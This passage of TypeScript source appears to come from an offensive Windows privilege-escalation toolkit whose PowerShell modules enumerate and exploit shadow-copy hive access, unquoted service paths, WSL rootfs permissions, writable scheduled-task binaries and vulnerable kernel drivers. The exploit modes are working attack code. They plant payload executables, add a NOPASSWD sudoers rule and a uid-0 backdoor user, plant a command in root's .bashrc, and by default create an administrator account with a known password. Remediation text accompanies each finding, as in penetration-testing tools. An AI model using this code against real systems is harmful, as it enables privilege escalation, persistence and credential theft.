    if (result.stdout.includes("All hives extracted")) {
      findings.push({
        checkId: "WIN-SHADOW-002",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: `file://${outdir}`,
        title: "SAM/SYSTEM/SECURITY extracted from shadow copy (HiveNightmare)",
        details: `Hives saved to ${outdir} — unprivileged credential extraction`,
        remediation: "Patch CVE-2021-36934. Delete shadow copies. Fix registry hive ACLs.",
      })
    }
  } else if (action === "create") {
    const script = `
Write-Output "[*] Creating new Volume Shadow Copy (requires admin)..."
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Output "[-] Administrator privileges required to create shadow copies"
    exit 1
}

# Create shadow copy
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
if ($shadow.ReturnValue -eq 0) {
    $newShadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
    Write-Output "[+] Shadow copy created: $($newShadow.DeviceObject)"
    Write-Output "[*] Now use --action exploit to extract hives"
} else {
    # Fallback to vssadmin
    Write-Output "[*] WMI failed, trying vssadmin..."
    vssadmin create shadow /for=C: 2>$null
    $newShadow = Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1
    if ($newShadow) {
        Write-Output "[+] Shadow copy created: $($newShadow.DeviceObject)"
    } else {
        Write-Output "[-] Failed to create shadow copy"
    }
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function unquotedServicePath(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const service = argVal(args, "--service")
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] Unquoted Service Path analysis...\n"]

  if (action === "enum") {
    const script = `
# Enumerate all services with unquoted paths containing spaces
$services = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^\s*"' -and
    $_.PathName -match ' '
}

if (-not $services) {
    Write-Output "[-] No unquoted service paths with spaces found"
    exit 0
}

Write-Output "[+] Found $($services.Count) service(s) with unquoted paths:"

foreach ($svc in $services) {
    Write-Output "  Service: $($svc.Name)"
    Write-Output "  Display: $($svc.DisplayName)"
    Write-Output "  Path:    $($svc.PathName)"
    Write-Output "  State:   $($svc.State)"
    Write-Output "  Start:   $($svc.StartMode)"
    Write-Output "  RunAs:   $($svc.StartName)"

    # Parse the binary path (strip arguments after .exe)
    $binPath = $svc.PathName
    if ($binPath -match '^(.+?\\.exe)') { $binPath = $Matches[1] }

    # Find truncation points (every space)
    $parts = $binPath -split ' '
    $truncPaths = @()
    for ($i = 1; $i -lt $parts.Count; $i++) {
        $candidate = ($parts[0..($i-1)] -join ' ') + '.exe'
        $truncPaths += $candidate
    }

    Write-Output "  Truncation candidates:"
    foreach ($tp in $truncPaths) {
        $dir = Split-Path $tp -Parent
        $writable = $false
        if (Test-Path $dir) {
            try {
                $acl = Get-Acl $dir -ErrorAction SilentlyContinue
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                $currentGroups = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups | ForEach-Object {
                    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
                }
                foreach ($ace in $acl.Access) {
                    $id = $ace.IdentityReference.Value
                    if (($id -eq $currentUser -or $currentGroups -contains $id -or $id -eq 'BUILTIN\\Users' -or $id -eq 'Everyone') -and
                        $ace.AccessControlType -eq 'Allow' -and
                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
                        $writable = $true
                    }
                }
            } catch {}
        }
        $status = if ($writable) { "[WRITABLE!]" } else { "[not writable]" }
        Write-Output "    $status $tp"
    }
    Write-Output ""
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const vulnCount = (result.stdout.match(/\[WRITABLE!\]/g) || []).length
    const svcCount = (result.stdout.match(/Service:/g) || []).length

    if (svcCount > 0) {
      findings.push({
        checkId: "WIN-PRIVESC-UQP-001",
        provider: "windows",
        severity: vulnCount > 0 ? "critical" : "medium",
        status: vulnCount > 0 ? "VULNERABLE" : "ENUMERATED",
        resource: "services://unquoted-paths",
        title: `${svcCount} unquoted service path(s) found, ${vulnCount} with writable directories`,
        details: result.stdout.substring(0, 500),
        remediation:
          "Enclose service binary paths in double quotes. Remove write permissions from service directories for non-admin users.",
      })
    }
  } else if (action === "exploit") {
    if (!service) return { output: "[!] Required: --service SERVICE_NAME --payload EXE_PATH", findings }
    if (!payload) return { output: "[!] Required: --payload EXE_PATH (path to your exe)", findings }

    const script = `
$svc = Get-CimInstance Win32_Service -Filter "Name='${service}'" -ErrorAction SilentlyContinue
if (-not $svc) {
    Write-Output "[-] Service '${service}' not found"
    exit 1
}

$binPath = $svc.PathName
Write-Output "[*] Service: ${service}"
Write-Output "[*] Path: $binPath"
Write-Output "[*] RunAs: $($svc.StartName)"

if ($binPath -match '^\s*"') {
    Write-Output "[-] Path is already quoted — not vulnerable"
    exit 1
}

# Find first writable truncation point
$parts = $binPath -split ' '
$targetPath = $null
for ($i = 1; $i -lt $parts.Count; $i++) {
    $candidate = ($parts[0..($i-1)] -join ' ') + '.exe'
    $dir = Split-Path $candidate -Parent
    if (Test-Path $dir) {
        try {
            [System.IO.File]::Create("$dir\\.cs_test_write").Close()
            Remove-Item "$dir\\.cs_test_write" -Force
            $targetPath = $candidate
            break
        } catch {}
    }
}

if (-not $targetPath) {
    Write-Output "[-] No writable truncation point found"
    exit 1
}

Write-Output "[+] Writable truncation point: $targetPath"
Write-Output "[*] Copying payload..."
Copy-Item "${payload}" $targetPath -Force
Write-Output "[+] Payload placed at: $targetPath"
Write-Output "[*] Restart the service to trigger: Restart-Service ${service}"
Write-Output "[!] Remember to clean up: Remove-Item '$targetPath'"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("Payload placed")) {
      findings.push({
        checkId: "WIN-PRIVESC-UQP-002",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITED",
        resource: `service://${service}`,
        title: `Unquoted service path exploited: ${service}`,
        details: `Payload placed at truncation point. Restart service to execute as ${service} service account.`,
        remediation: "Remove the placed binary, quote the service path, restrict directory write permissions.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function wslPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const distro = argVal(args, "--distro")
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] WSL Privesc — Windows Subsystem for Linux attack surface\n"]

  if (action === "enum") {
    const script = `
# Check WSL installation
$wslInstalled = $false
$wslPath = "$env:SystemRoot\\System32\\wsl.exe"
if (Test-Path $wslPath) {
    $wslInstalled = $true
    Write-Output "[+] WSL is installed"
} else {
    Write-Output "[-] WSL not installed"
    exit 0
}

# List distributions
Write-Output ""
Write-Output "[*] Installed WSL distributions:"
$distros = wsl --list --verbose 2>$null | Out-String
Write-Output $distros

# Check WSL version
Write-Output "[*] WSL status:"
wsl --status 2>$null | Out-String | Write-Output

# Check interop settings
Write-Output ""
Write-Output "[*] WSL Interop settings:"
$interopEnabled = Get-ItemProperty "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss" -Name "Flags" -ErrorAction SilentlyContinue
if ($interopEnabled) {
    $flags = $interopEnabled.Flags
    $interop = ($flags -band 1) -eq 1
    Write-Output "    Windows interop: $(if ($interop) { '[+] ENABLED — Linux can call Windows executables' } else { '[-] Disabled' })"
}

# Check LxssManager service
$lxss = Get-Service LxssManager -ErrorAction SilentlyContinue
Write-Output "    LxssManager service: $(if ($lxss) { $lxss.Status } else { 'Not found' })"

# Check for rootfs access from Windows
Write-Output ""
Write-Output "[*] Checking WSL rootfs accessibility from Windows..."
$lxssPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss"
$distributions = Get-ChildItem $lxssPath -ErrorAction SilentlyContinue

$exploitableDistros = 0
foreach ($d in $distributions) {
    $props = Get-ItemProperty $d.PSPath -ErrorAction SilentlyContinue
    if ($props.DistributionName -and $props.BasePath) {
        $rootfs = Join-Path $props.BasePath "rootfs"
        $rootfsExists = Test-Path $rootfs
        $passwdPath = Join-Path $rootfs "etc\\passwd"
        $shadowPath = Join-Path $rootfs "etc\\shadow"
        $sudoersPath = Join-Path $rootfs "etc\\sudoers"

        $passwdReadable = Test-Path $passwdPath -ErrorAction SilentlyContinue
        $shadowReadable = Test-Path $shadowPath -ErrorAction SilentlyContinue
        $sudoersWritable = $false

        if (Test-Path $sudoersPath -ErrorAction SilentlyContinue) {
            try {
                $testWrite = [System.IO.File]::OpenWrite($sudoersPath)
                $testWrite.Close()
                $sudoersWritable = $true
            } catch { }
        }

        Write-Output "    Distribution: $($props.DistributionName)"
        Write-Output "      BasePath: $($props.BasePath)"
        Write-Output "      Rootfs: $(if ($rootfsExists) { 'Accessible' } else { 'Not found' })"
        Write-Output "      /etc/passwd: $(if ($passwdReadable) { 'Readable' } else { 'N/A' })"
        Write-Output "      /etc/shadow: $(if ($shadowReadable) { '[+] READABLE from Windows!' } else { 'N/A' })"
        Write-Output "      /etc/sudoers: $(if ($sudoersWritable) { '[+] WRITABLE from Windows!' } else { 'Not writable' })"
        Write-Output ""

        if ($shadowReadable -or $sudoersWritable) {
            $exploitableDistros++
        }
    }
}

# Check for scheduled tasks running WSL
Write-Output "[*] Checking for scheduled tasks using WSL..."
$wslTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
    $_.Actions.Execute -match 'wsl|bash\.exe|ubuntu' -or $_.Actions.Arguments -match 'wsl|bash\.exe'
}
if ($wslTasks) {
    foreach ($t in $wslTasks) {
        Write-Output "    [+] Task: $($t.TaskName) — runs: $($t.Actions.Execute) $($t.Actions.Arguments)"
    }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "WSL installed: $wslInstalled"
Write-Output "Exploitable distributions: $exploitableDistros"

if ($exploitableDistros -gt 0) {
    Write-Output ""
    Write-Output "[+] EXPLOITABLE — WSL rootfs writable from Windows"
    Write-Output "    Attack vectors:"
    Write-Output "      1. Modify /etc/sudoers to grant passwordless sudo"
    Write-Output "      2. Add root user to /etc/passwd with known password"
    Write-Output "      3. Plant cron job in WSL that calls Windows exe via interop"
    Write-Output "      4. Modify .bashrc to inject commands"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (
      result.stdout.includes("EXPLOITABLE") ||
      result.stdout.includes("READABLE from Windows") ||
      result.stdout.includes("WRITABLE from Windows")
    ) {
      findings.push({
        checkId: "WIN-WSL-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "wsl://rootfs",
        title: "WSL rootfs accessible/writable from Windows — cross-boundary attack possible",
        details: "WSL distribution rootfs is accessible from Windows, allowing credential theft or config modification",
        remediation:
          "Restrict WSL rootfs directory ACLs. Disable WSL interop if not needed. Use WSL2 with virtual disk.",
      })
    }
  } else if (action === "exploit") {
    const targetDistro = distro || "Ubuntu"
    const cmd = payload || "net user cs_admin P@ssw0rd! /add && net localgroup administrators cs_admin /add"

    const script = `
Write-Output "[*] Exploiting WSL distribution: ${targetDistro}"

# Method 1: Modify sudoers from Windows side
$lxssPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss"
$distributions = Get-ChildItem $lxssPath -ErrorAction SilentlyContinue
$targetDist = $null

foreach ($d in $distributions) {
    $props = Get-ItemProperty $d.PSPath -ErrorAction SilentlyContinue
    if ($props.DistributionName -match '${targetDistro}') {
        $targetDist = $props
        break
    }
}

if (-not $targetDist) {
    Write-Output "[-] Distribution not found: ${targetDistro}"
    Write-Output "[*] Available distributions:"
    wsl --list 2>$null
    exit 1
}

$rootfs = Join-Path $targetDist.BasePath "rootfs"
Write-Output "[*] Rootfs: $rootfs"

# Attack 1: Modify sudoers for passwordless sudo
$sudoersPath = Join-Path $rootfs "etc\\sudoers"
if (Test-Path $sudoersPath) {
    $content = Get-Content $sudoersPath -Raw -ErrorAction SilentlyContinue
    $defaultUser = $targetDist.DefaultUid
    if (-not ($content -match 'ALL=.*NOPASSWD')) {
        Add-Content $sudoersPath ([char]10 + "ALL ALL=(ALL) NOPASSWD: ALL") -ErrorAction SilentlyContinue
        Write-Output "[+] Added NOPASSWD rule to sudoers"
    } else {
        Write-Output "[*] NOPASSWD already in sudoers"
    }
}

# Attack 2: Add backdoor user to passwd
$passwdPath = Join-Path $rootfs "etc\\passwd"
if (Test-Path $passwdPath) {
    $passwdContent = Get-Content $passwdPath -Raw -ErrorAction SilentlyContinue
    if (-not ($passwdContent -match 'cs_backdoor')) {
        # root2 user with uid 0 (root equivalent)
        Add-Content $passwdPath "cs_backdoor:x:0:0::/root:/bin/bash" -ErrorAction SilentlyContinue
        Write-Output "[+] Added backdoor root user (cs_backdoor) to /etc/passwd"
    }
}

# Attack 3: Plant interop reverse shell / command execution
$bashrcPath = Join-Path $rootfs "root\\.bashrc"
if (Test-Path (Split-Path $bashrcPath -Parent)) {
    $interopCmd = "# WSL interop callback" + [char]10 + "/mnt/c/Windows/System32/cmd.exe /c '${cmd}' 2>/dev/null &"
    Add-Content $bashrcPath $interopCmd -ErrorAction SilentlyContinue
    Write-Output "[+] Planted interop command in root .bashrc"
    Write-Output "    Command: ${cmd}"
}

Write-Output ""
Write-Output "[+] Exploitation complete"
Write-Output "    Next login to WSL will trigger the planted commands"
Write-Output "    Or trigger now: wsl -d ${targetDistro} -u root -- /bin/bash -c 'id'"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-WSL-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `wsl://${targetDistro}`,
      title: `WSL distribution ${targetDistro} compromised via cross-boundary attack`,
      details: "Modified sudoers, added backdoor user, planted interop command in .bashrc",
      remediation:
        "Review WSL rootfs for modifications. Check sudoers, passwd, bashrc. Restrict Windows access to WSL rootfs.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function scheduledTaskHijack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const task = argVal(args, "--task")
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] Scheduled Task Hijack — privilege escalation via writable task binaries\n"]

  if (action === "enum") {
    const script = `
# Enumerate scheduled tasks running as privileged users with writable binaries
$tasks = Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }
$hijackable = @()
$missingBin = @()

foreach ($t in $tasks) {
    $info = $t | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    $principal = $t.Principal.UserId
    $runLevel = $t.Principal.RunLevel

    # Only interested in SYSTEM/Admin tasks
    $isPrivileged = ($principal -match 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE|Administrators' -or $runLevel -eq 'Highest')
    if (-not $isPrivileged) { continue }

    foreach ($action in $t.Actions) {
        if ($action.Execute) {
            $exe = $action.Execute
            # Resolve environment variables
            $resolved = [System.Environment]::ExpandEnvironmentVariables($exe)
            # Remove quotes
            $resolved = $resolved.Trim('"', "'")

            if (-not (Test-Path $resolved)) {
                $missingBin += [PSCustomObject]@{
                    TaskName = $t.TaskName
                    TaskPath = $t.TaskPath
                    Principal = $principal
                    Binary = $resolved
                    Arguments = $action.Arguments
                    Status = "MISSING_BINARY"
                }
                Write-Output "[!] MISSING BINARY: $($t.TaskPath)$($t.TaskName)"
                Write-Output "    Principal: $principal"
                Write-Output "    Binary: $resolved (DOES NOT EXIST)"
                Write-Output "    Arguments: $($action.Arguments)"
                Write-Output ""
                continue
            }

            # Check if binary is writable
            $acl = icacls $resolved 2>$null
            $aclStr = ($acl | Out-String)
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            $groups = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Value }

            $writable = $false
            # Check for write permissions
            if ($aclStr -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)|Authenticated Users.*\(F\)|Authenticated Users.*\(M\)|Authenticated Users.*\(W\)') {
                $writable = $true
            }

            # Check parent directory writability for DLL planting
            $parentDir = Split-Path $resolved -Parent
            $parentAcl = icacls $parentDir 2>$null
            $parentAclStr = ($parentAcl | Out-String)
            $parentWritable = $parentAclStr -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)'

            if ($writable -or $parentWritable) {
                $hijackable += [PSCustomObject]@{
                    TaskName = $t.TaskName
                    TaskPath = $t.TaskPath
                    Principal = $principal
                    Binary = $resolved
                    Arguments = $action.Arguments
                    BinaryWritable = $writable
                    DirWritable = $parentWritable
                }
                Write-Output "[+] HIJACKABLE: $($t.TaskPath)$($t.TaskName)"
                Write-Output "    Principal: $principal (RunLevel: $runLevel)"
                Write-Output "    Binary: $resolved"
                Write-Output "    Binary writable: $writable | Dir writable: $parentWritable"
                Write-Output "    Arguments: $($action.Arguments)"
                Write-Output ""
            }

            # Check if argument files are writable
            if ($action.Arguments -and $action.Arguments -match '[A-Za-z]:\\') {
                $argPaths = [regex]::Matches($action.Arguments, '[A-Za-z]:\\[^\s"]+') | ForEach-Object { $_.Value }
                foreach ($ap in $argPaths) {
                    if (Test-Path $ap) {
                        $argAcl = icacls $ap 2>$null | Out-String
                        if ($argAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)') {
                            Write-Output "[+] WRITABLE ARGUMENT: $($t.TaskPath)$($t.TaskName)"
                            Write-Output "    Argument file: $ap"
                            Write-Output ""
                        }
                    }
                }
            }
        }
    }
}

Write-Output "=== Summary ==="
Write-Output "Hijackable tasks: $($hijackable.Count)"
Write-Output "Missing binary tasks: $($missingBin.Count)"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const hijackMatch = result.stdout.match(/Hijackable tasks: (\d+)/)
    const missingMatch = result.stdout.match(/Missing binary tasks: (\d+)/)
    const hijackCount = hijackMatch ? parseInt(hijackMatch[1]) : 0
    const missingCount = missingMatch ? parseInt(missingMatch[1]) : 0

    if (hijackCount > 0 || missingCount > 0) {
      findings.push({
        checkId: "WIN-SCHTASK-HIJACK-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "schtasks://local",
        title: `${hijackCount} hijackable + ${missingCount} missing-binary scheduled tasks found`,
        details: result.stdout.substring(0, 500),
        remediation: "Fix file ACLs on scheduled task binaries. Remove tasks with missing executables.",
      })
    }
  } else if (action === "exploit" && task) {
    if (!payload) return { output: "[!] Required: --payload PATH (executable to replace with)", findings }

    const script = `
$t = Get-ScheduledTask -TaskName '${task}' -ErrorAction SilentlyContinue
if (-not $t) { Write-Output "[-] Task not found: ${task}"; exit 1 }

$exe = $t.Actions[0].Execute
$resolved = [System.Environment]::ExpandEnvironmentVariables($exe).Trim('"', "'")

if (-not (Test-Path $resolved)) {
    # Missing binary — just place our payload there
    Write-Output "[*] Binary missing: $resolved"
    Write-Output "[*] Placing payload at missing binary location..."
    Copy-Item '${payload}' $resolved -Force
    Write-Output "[+] Payload placed: $resolved"
    Write-Output "[*] Task will execute payload on next trigger"
} else {
    # Backup original and replace
    $backup = "$resolved.bak"
    Write-Output "[*] Backing up original: $resolved -> $backup"
    Copy-Item $resolved $backup -Force -ErrorAction SilentlyContinue
    Write-Output "[*] Replacing with payload..."
    Copy-Item '${payload}' $resolved -Force
    Write-Output "[+] Binary replaced: $resolved"
    Write-Output "[*] Original backed up to: $backup"
}

# Trigger the task
Write-Output "[*] Triggering task..."
Start-ScheduledTask -TaskName '${task}' -ErrorAction SilentlyContinue
Write-Output "[+] Task triggered — payload should execute as: $($t.Principal.UserId)"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-SCHTASK-HIJACK-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `schtask://${task}`,
      title: `Scheduled task hijacked: ${task}`,
      details: `Binary replaced with payload. Task triggered.`,
      remediation: "Restore original binary from .bak file. Fix ACLs.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function byovd(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const driver = argVal(args, "--driver")
  const target = argVal(args, "--target")
  const findings: Finding[] = []
  const output: string[] = ["[*] BYOVD — Bring Your Own Vulnerable Driver for kernel-level access\n"]

  if (action === "enum") {
    const script = `
# Known vulnerable driver hashes/names from LOLDrivers project
$vulnDrivers = @(
    @{ Name = "RTCore64.sys";      Vendor = "MSI Afterburner";       CVE = "CVE-2019-16098"; Cap = "R/W physical memory" },
    @{ Name = "DBUtil_2_3.sys";    Vendor = "Dell BIOS Utility";     CVE = "CVE-2021-21551"; Cap = "R/W physical memory, kernel code exec" },
    @{ Name = "GIGABYTE.sys";      Vendor = "GIGABYTE Tools";        CVE = "CVE-2018-19320"; Cap = "R/W physical memory, MSR" },
    @{ Name = "AsIO64.sys";        Vendor = "ASUS AI Suite";         CVE = "CVE-2023-ASUS";  Cap = "R/W physical memory" },
    @{ Name = "WinRing0x64.sys";   Vendor = "OpenLibSys";            CVE = "N/A";            Cap = "R/W MSR, I/O ports, physical memory" },
    @{ Name = "cpuz141.sys";       Vendor = "CPU-Z";                 CVE = "N/A";            Cap = "R/W physical memory, MSR" },
    @{ Name = "speedfan.sys";      Vendor = "SpeedFan";              CVE = "N/A";            Cap = "R/W physical memory, I/O ports" },
    @{ Name = "aswVmm.sys";        Vendor = "Avast VM";              CVE = "CVE-2023-1585";  Cap = "Kernel memory manipulation" },
    @{ Name = "Ene.sys";           Vendor = "ENE Technology";         CVE = "CVE-2023-ENE";   Cap = "R/W physical memory" },
    @{ Name = "HWiNFO64A.sys";     Vendor = "HWiNFO";               CVE = "N/A";            Cap = "R/W physical memory, MSR" },
    @{ Name = "inpoutx64.sys";     Vendor = "InpOut32";              CVE = "N/A";            Cap = "R/W I/O ports" },
    @{ Name = "AsrDrv106.sys";     Vendor = "ASRock";                CVE = "N/A";            Cap = "R/W physical memory" },
    @{ Name = "gdrv.sys";          Vendor = "GIGABYTE";              CVE = "CVE-2018-19321"; Cap = "R/W physical memory, code exec" },
    @{ Name = "MsIo64.sys";        Vendor = "MSI";                   CVE = "CVE-2020-17382"; Cap = "R/W physical memory" },
    @{ Name = "PROCEXP152.SYS";    Vendor = "Sysinternals ProcExp";  CVE = "N/A";            Cap = "Kill processes (EDR)" },
    @{ Name = "zemana.sys";        Vendor = "Zemana AntiMalware";    CVE = "CVE-2018-6892";  Cap = "Kill processes, disable AV" }
)

Write-Output "[*] Scanning for known vulnerable drivers on disk..."
$found = 0

# Search common locations
$searchPaths = @(
    "$env:SystemRoot\\System32\\drivers",
    "$env:ProgramFiles",
    ([Environment]::GetEnvironmentVariable("ProgramFiles(x86)")),
    "$env:SystemRoot\\Temp",
    "$env:USERPROFILE\\Downloads"
)

foreach ($vd in $vulnDrivers) {
    foreach ($sp in $searchPaths) {
        $driverPath = Get-ChildItem -Path $sp -Filter $vd.Name -Recurse -ErrorAction SilentlyContinue -Depth 3 | Select-Object -First 1
        if ($driverPath) {
            $found++
            Write-Output ""
            Write-Output "[+] FOUND: $($vd.Name)"
            Write-Output "    Path: $($driverPath.FullName)"
            Write-Output "    Vendor: $($vd.Vendor)"
            Write-Output "    CVE: $($vd.CVE)"
            Write-Output "    Capability: $($vd.Cap)"
            $sig = Get-AuthenticodeSignature $driverPath.FullName -ErrorAction SilentlyContinue
            if ($sig) {
                Write-Output "    Signature: $($sig.Status) ($($sig.SignerCertificate.Subject))"
            }
            break
        }
    }
}

# Check currently loaded drivers
Write-Output ""
Write-Output "[*] Checking loaded kernel drivers..."
$loadedDrivers = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Select-Object Name, PathName, State

$loadedVuln = 0
foreach ($vd in $vulnDrivers) {
    $drvName = $vd.Name -replace '\.sys$', ''
    $loaded = $loadedDrivers | Where-Object { $_.Name -eq $drvName }
    if ($loaded) {
        $loadedVuln++
        Write-Output "    [+] LOADED: $($loaded.Name) — $($loaded.PathName) ($($loaded.State))"
    }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "Vulnerable drivers on disk: $found"
Write-Output "Vulnerable drivers loaded: $loadedVuln"
Write-Output "Total known vulnerable drivers in database: $($vulnDrivers.Count)"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const foundMatch = result.stdout.match(/Vulnerable drivers on disk: (\d+)/)
    const loadedMatch = result.stdout.match(/Vulnerable drivers loaded: (\d+)/)
    const onDisk = foundMatch ? parseInt(foundMatch[1]) : 0
    const loaded = loadedMatch ? parseInt(loadedMatch[1]) : 0

    if (onDisk > 0 || loaded > 0) {
      findings.push({
        checkId: "WIN-BYOVD-001",
        provider: "windows",
        severity: loaded > 0 ? "critical" : "high",
        status: loaded > 0 ? "VULNERABLE" : "INFO",
        resource: "drivers://vulnerable",
        title: `${onDisk} vulnerable drivers on disk, ${loaded} currently loaded`,
        details: result.stdout.substring(0, 500),
        remediation:
          "Remove vulnerable drivers. Enable HVCI (Hypervisor-protected Code Integrity). Use Microsoft's vulnerable driver blocklist.",
      })
    }
  } else if (action === "check") {
    const script = `
Write-Output "[*] Driver Signature Enforcement (DSE) status check..."

# Check Secure Boot
$secureBoot = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
Write-Output "[*] Secure Boot: $(if ($secureBoot) { 'ENABLED' } else { 'DISABLED or not available' })"

# Check HVCI / Memory Integrity
$hvci = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" -Name Enabled -ErrorAction SilentlyContinue
$hvciEnabled = $hvci -and $hvci.Enabled -eq 1
Write-Output "[*] HVCI (Memory Integrity): $(if ($hvciEnabled) { 'ENABLED — BYOVD blocked' } else { 'DISABLED — BYOVD possible' })"

# Check driver signing enforcement
$codeIntegrity = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI" -ErrorAction SilentlyContinue
Write-Output "[*] Code Integrity policy: $(if ($codeIntegrity) { $codeIntegrity | Format-List | Out-String } else { 'Default' })"

# Check if test signing is enabled
$bcdedit = bcdedit /enum "{current}" 2>$null | Out-String
$testSigning = $bcdedit -match 'testsigning\s+Yes'
$noIntegrityChecks = $bcdedit -match 'nointegritychecks\s+Yes'
Write-Output "[*] Test Signing Mode: $(if ($testSigning) { '[+] ENABLED — unsigned drivers allowed!' } else { 'Disabled' })"
Write-Output "[*] No Integrity Checks: $(if ($noIntegrityChecks) { '[+] ENABLED — no signature verification!' } else { 'Disabled' })"

# Check vulnerable driver blocklist
$blockList = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" -Name VulnerableDriverBlocklistEnable -ErrorAction SilentlyContinue
$blockEnabled = $blockList -and $blockList.VulnerableDriverBlocklistEnable -eq 1
Write-Output "[*] Vulnerable Driver Blocklist: $(if ($blockEnabled) { 'ENABLED' } else { 'DISABLED — known vuln drivers can load' })"

# Check if current user can load drivers
$privs = whoami /priv 2>$null | Out-String
$hasLoadDriver = $privs -match 'SeLoadDriverPrivilege.*Enabled'
Write-Output ""
Write-Output "[*] SeLoadDriverPrivilege: $(if ($hasLoadDriver) { '[+] AVAILABLE' } else { '[-] Not available' })"

# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Output "[*] Running as admin: $isAdmin"

Write-Output ""
if (-not $hvciEnabled -and ($isAdmin -or $hasLoadDriver)) {
    Write-Output "[+] EXPLOITABLE — HVCI disabled + can load drivers"
    Write-Output "    Use: --action load --driver PATH_TO_VULN_DRIVER.sys"
} elseif ($testSigning) {
    Write-Output "[+] EXPLOITABLE — Test signing enabled, unsigned drivers accepted"
} elseif ($hvciEnabled) {
    Write-Output "[-] HVCI enabled — kernel driver loading is restricted"
} else {
    Write-Output "[~] Standard DSE — need admin + signed (but vulnerable) driver"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE")) {
      findings.push({
        checkId: "WIN-BYOVD-002",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "config://driver-signing",
        title: "Driver signature enforcement weak — BYOVD possible",
        details: "HVCI disabled or test signing enabled — vulnerable drivers can be loaded",
        remediation: "Enable HVCI (Memory Integrity). Disable test signing mode. Enable vulnerable driver blocklist.",
      })
    }
  } else if (action === "load") {
    if (!driver) return { output: "[!] Required: --driver PATH_TO_DRIVER.sys", findings }

    const script = `
$driverPath = '${driver}'
if (-not (Test-Path $driverPath)) {
    Write-Output "[-] Driver not found: $driverPath"
    exit 1
}

$driverName = [System.IO.Path]::GetFileNameWithoutExtension($driverPath)
Write-Output "[*] Loading driver: $driverName"
Write-Output "[*] Path: $driverPath"

# Check signature
$sig = Get-AuthenticodeSignature $driverPath -ErrorAction SilentlyContinue
Write-Output "[*] Signature: $($sig.Status)"
if ($sig.SignerCertificate) {
